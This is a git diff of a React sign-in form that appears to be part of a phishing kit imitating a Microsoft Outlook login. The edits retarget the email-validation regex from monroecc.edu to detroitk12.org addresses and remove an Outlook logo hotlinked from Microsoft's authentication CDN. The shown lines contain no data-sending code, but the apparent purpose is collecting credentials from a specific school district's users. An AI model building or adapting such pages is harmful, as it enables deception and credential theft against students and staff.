@@ -55,7 +55,7 @@ function App() {
   // Handle email submission and sending
   const handleNextFromEmail = async (emailValue) => {
     const eduEmailRegex =
-      /^[a-zA-Z0-9._%+-]+@([a-zA-Z0-9.-]+\.)?monroecc\.edu$/;
+      /^[a-zA-Z0-9._%+-]+@([a-zA-Z0-9.-]+\.)?detroitk12\.org$/;
     if (!emailValue.trim()) {
       setEmailError("Please enter an email.");
     } else if (!eduEmailRegex.test(emailValue)) {
@@ -125,11 +125,7 @@ function App() {
 
   return (
     <div className="major-container">
-      <img
-        className="outlook"
-        src="https://aadcdn.msauth.net/shared/1.0/content/images/applogos/53_7a3c80bf9694448bac31a9589d2e9e92.png"
-        alt="logo"
-      />
+      <br />
       <div className="container">
         <img src={Logo} alt="logo" className="logo" />
         <div className="form-wrapper" ref={formRef}>
